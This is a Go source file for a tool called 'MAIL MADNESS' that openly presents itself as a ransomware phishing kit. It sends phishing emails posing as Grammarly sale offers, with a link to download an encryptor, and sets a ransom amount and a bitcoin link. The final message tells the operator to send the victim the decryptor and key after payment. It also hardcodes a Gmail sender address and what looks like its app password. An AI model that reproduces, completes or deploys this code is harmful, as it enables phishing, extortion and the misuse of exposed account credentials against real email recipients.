package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/mail"
	"net/smtp"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

type Settings struct {
	amount       int
	link         string
	key          string
	sender_email string
	sender_pass  string
	target_email string
	template     string
	subject      string
	server_url   string // Add server URL to settings
}

// Initialize struct with default values
var current = Settings{
	amount:       10000,
	link:         "bitcoin.com/uh4v3b33nh4ck3d",
	key:          "32charactersforthekeysoifillitup",
	sender_email: "businessgrammarly@gmail.com",
	sender_pass:  "qqurqhgcxogcbbam",
	target_email: "sophiaishere291@gmail.com",
	template:     "temp1.html",
	subject:      "Sale extended: Save 50% on Grammarly Premium",
	server_url:   "http://localhost:8080/encrypt", // URL to download encryption program
}

var templateChoice = [5]string{"temp1.html", "temp2.html", "temp3.html"}
var defaultSubject = [5]string{"Sale extended: Save 50% on Grammarly Premium",
	"Improve your Work With Grammarly Premium Today!",
	"Elevate your work with 50% off Premium"}

func main() {
	command := "hello"

	design()
	fmt.Println("THANK YOU FOR USING MAIL MADNESS. In this tool, we can help you create a")
	fmt.Println("ransomware, generate an email based on the given set of templates or your")
	fmt.Println("very own template, and send it to your desired target using our sample")
	fmt.Println("account or your very own.")
	fmt.Println(" ")
	fmt.Println("Here are some of the commands that you should now to get started:")
	displayCommands()
	displaySettings()
	fmt.Println("Use help to display commands for this tool")
	fmt.Println("Have fun using this tool! :)\n")

	scan := bufio.NewReader(os.Stdin)
	for command != "quit" {
		fmt.Print("Command: ")
		command, _ := scan.ReadString('\n')
		command = strings.TrimSpace(command)  // Remove whitespaces
		splitWords := strings.Fields(command) // Split command into words in array

		if len(splitWords) == 3 {
			first := splitWords[0]
			if first == "set" {
				second := splitWords[1]
				third := splitWords[2]
				if second == "TARGET_ADDR" {
					validateTarget(third)
				} else if second == "TEMPLATE" {
					validateHTML(third)
				} else {
					errorMsg()
				}
			} else if command == "GO MAIL MADNESS" {
				buildEncryption()
				buildDecryption()
				sendEmail()
			} else {
				errorMsg()
			}
		} else if splitWords[0] == "set" && splitWords[1] == "SUBJECT" && len(splitWords) >= 3 {
			subj := splitWords[2:]             // Remove set SUBJECT
			strSubj := strings.Join(subj, " ") // Combine to string since array
			fmt.Println("Changed subject to " + strSubj + "\n")
			current.subject = strSubj
		} else if command == "display" && len(splitWords) == 1 {
			displaySettings()
		} else if command == "help" && len(splitWords) == 1 {
			displayCommands()
		} else if command == "quit" && len(splitWords) == 1 {
			fmt.Println("Thank you for using MAIL MADNESS! Go forth and be crazy.")
			fmt.Println("Quitting...\n\n")
			break
		} else {
			errorMsg()
		}
	}
}

func displayCommands() {
	fmt.Println("'''''''''''''''DISPLAYING SET OF COMMANDS'''''''''''''''")
	fmt.Println("   display")
	fmt.Println("       --> prints the current settings user made")
	fmt.Println("   GO MAIL MADNESS")
	fmt.Println("       --> start sending the target a ransomware email based on settings")
	fmt.Println("   help")
	fmt.Println("       --> display commands for this tool")
	fmt.Println("   set SUBJECT <message>")
	fmt.Println("       --> sets the subject of the email")
	fmt.Println("       --> note that this automatically changes when the template is changed")
	fmt.Println("   set TARGET_ADDR <target email address>")
	fmt.Println("       --> sets the target's receiver for the email")
	fmt.Println("   set TEMPLATE <html_file>")
	fmt.Println("       --> sets the body the target will be receiving.")
	fmt.Println("       --> Kindly view them in the package.")
	fmt.Println("       --> kindly choose from our given templates:")
	fmt.Println("       --> kindly choose temp1.html & temp2.html if your target victim is a linux user:")
	fmt.Println("       --> kindly choose temp1win.html if your target victim is a windows user:")
	fmt.Println("               temp1.html temp1win.html temp2.html temp3.html")
	fmt.Println("   quit")
	fmt.Println("       --> exit the program. Will not save nor send anything")
	fmt.Println("''''''''''''''''''''''''''''''''''''''''''''''''''''''''\n")
}

func displaySettings() {
	strAmount := strconv.Itoa(current.amount)
	fmt.Println("===============DISPLAYING CURRENT SETTINGS===============")
	fmt.Println("  AMOUNT               |  P " + strAmount)
	fmt.Println("  LINK                 |  " + current.link)
	fmt.Println("  KEY                  |  " + current.key)
	fmt.Println("  SENDER EMAIL (fixed) |  " + current.sender_email)
	fmt.Println("  SUBJECT/HEADER       |  " + current.subject)
	fmt.Println("  TARGET EMAIL         |  " + current.target_email)
	fmt.Println("  TEMPLATE             |  " + current.template)
	fmt.Println("=========================================================\n")
}

func validateTarget(address string) {
	_, err := mail.ParseAddress(address)
	if err != nil {
		fmt.Println("ERROR: Email Address is invalid. Try again.\n")
	} else {
		fmt.Println("Changed target email address to " + address + "\n")
		current.target_email = address
	}
}

func validateHTML(file string) {
	exists := false
	for index, temp := range templateChoice {
		if file == temp {
			fmt.Println("Changed template to " + file + "...")
			fmt.Println("Subject will also be changed to " + defaultSubject[index] + "\n")
			current.template = file
			current.subject = defaultSubject[index]
			exists = true
			break
		}
	}

	if exists == false {
		fmt.Println("ERROR: Template is invalid. Kindly choose one of the these: ")
		fmt.Print("         ")
		for _, temp := range templateChoice {
			fmt.Print(temp + "   ")
		}
		fmt.Println("\n")
	}
}

func buildEncryption() {
	fmt.Print("Building encrypt... ")
	//does nothing since there is already a pre-built encrypt.exe on the server
	fmt.Println(" done")
}

func buildDecryption() {
	fmt.Print("Building decrypt... ")
	cmd := exec.Command("go", "build", "decrypt.go")
	err := cmd.Run()
	if err != nil {
		fmt.Println("Error:", err)
	} else {
		fmt.Println(" done")
	}
}

func sendEmail() {
	fmt.Println("Starting to send email...")

	// Read the HTML template file
	htmlContent, err := ioutil.ReadFile(current.template)
	if err != nil {
		fmt.Println("Failed to read HTML template:", err)
		return
	}
	fmt.Println("HTML content read successfully.")

	// Modify HTML content to include a link to download the encryption program
	htmlContentWithLink := strings.Replace(string(htmlContent), "{{download_link}}", current.server_url, -1)

	// Update the SMTP server to Gmail
	auth := smtp.PlainAuth("", current.sender_email, current.sender_pass, "smtp.gmail.com")

	to := []string{current.target_email}
	msg := []byte("To: " + current.target_email + "\r\n" +
		"Subject: " + current.subject + "\r\n" +
		"MIME-Version: 1.0\r\n" +
		"Content-Type: text/html; charset=\"UTF-8\"\r\n" +
		"\r\n" +
		htmlContentWithLink + "\r\n")

	// Connect to the SMTP server
	fmt.Println("Connecting to the SMTP server...")
	err = smtp.SendMail("smtp.gmail.com:587", auth, current.sender_email, to, msg)
	if err != nil {
		fmt.Println("Failed to send email:", err)
	} else {
		fmt.Println("Email sent successfully to", current.target_email)
		finalMsg()
	}
}

func finalMsg() {
	fmt.Println(" ")
	fmt.Println("CONGRATULATIONS! You have successfully used our service and sent an email to the")
	fmt.Println("victim! Once you've received the payment, kindly email the victim with the")
	fmt.Println("decrypt.exe along with the key, \"" + current.key + "\".\n")
	fmt.Println("decrypt.exe can now be found within the package.\n")
	fmt.Println("Thank you for using our service! Just a quick note that using this does not")
	fmt.Println("automatically guarantee that the victim will click the malicious button.")
	fmt.Println("You may continue with the program again. Best of luck!\n")
}

func errorMsg() {
	fmt.Println("ERROR: Unknown command. Refer to help for more information.")
	fmt.Println("       Note: Commands are case sensitive!!\n")
}

func design() {
	fmt.Println("----------------------------------------------------")
	fmt.Println("|                |\\  /|   /\\   | |                 |")
	fmt.Println("|                | \\/ |  /__\\  | |                 |")
	fmt.Println("|                |    | /    \\ | |___              |")
	fmt.Println("|                     __          ___  __  __      |")
	fmt.Println("|      |\\  /|   /\\   |  \\  |\\  | |    |   |        |")
	fmt.Println("|      | \\/ |  /__\\  |   | | \\ | |--   --  --      |")
	fmt.Println("|      |    | /    \\ |__/  |  \\| |___  __| __|     |")
	fmt.Println("----------------------------------------------------\n")
}
